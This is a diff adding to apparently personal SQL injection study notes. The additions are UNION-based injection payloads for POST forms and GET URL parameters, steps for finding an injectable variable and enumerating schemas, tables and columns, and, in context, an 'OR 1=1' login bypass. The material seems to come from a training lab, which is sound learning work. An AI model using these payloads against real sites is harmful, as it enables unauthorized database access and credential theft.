@@ -107,10 +107,32 @@ Injection Example: SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=�
                                f12 --> Network --> Press Login --- A POST Request will be sent, select it, go to Request, copy and paste the RAW to url bar: <url>?<paste>, enter #Turns a POST to GET, gives login info
                                THIS IS ALL YOU CAN GET FROM A LOGIN PAGE
 
+ Gold Statement - UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns;#
+                  UNION SELECT 1,2,3,4,5;#
+
+Union Demo: Steps -  Do something legit and see what happens, does the URL change with variables or does it stay the same?
+                     Try to determine what type of action is being done, is it a SELECT, INSERT, UPDATE, etc.
+                     Test the variables with some truth logic. Such as using AND 1=1, or OR 1=1, looking for the information for the items is still returned
+                     Once the injectable variable is found attach your inject and start enumming. Grab the schema: databases, tables, columns.
+
+Gold.txt {
+POST REQUESTS -- These go into text box
+
+UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns;#
+
+UNION SELECT 1,2,3,4,5;#
+
+Audi'UNION SELECT tireid,2,name,cost,size FROM session.Tires;#
 
 
+GET REQUESTS -- These go into url
 
+Selection=2 UNION SELECT 1,2,3;#
 
+Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
+
+Selection=2 UNION SELECT carid,year,name FROM session.car;#
+}
 
 
            
